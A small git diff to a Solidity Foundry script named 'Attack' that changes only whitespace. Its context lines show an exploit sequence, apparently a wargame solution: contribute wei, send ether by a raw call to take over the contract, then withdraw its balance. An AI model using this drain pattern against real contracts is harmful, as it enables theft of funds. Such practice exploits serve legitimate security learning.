@@ -12,7 +12,7 @@ contract Attack is Script {
         vm.startBroadcast();
 
         instance.contribute{value: 10 wei}();
-        (bool success, ) = address(instance).call{value: 10 wei}("");
+        (bool success,) = address(instance).call{value: 10 wei}("");
         require(success, "Failed to transfer ether");
         instance.withdraw();
 
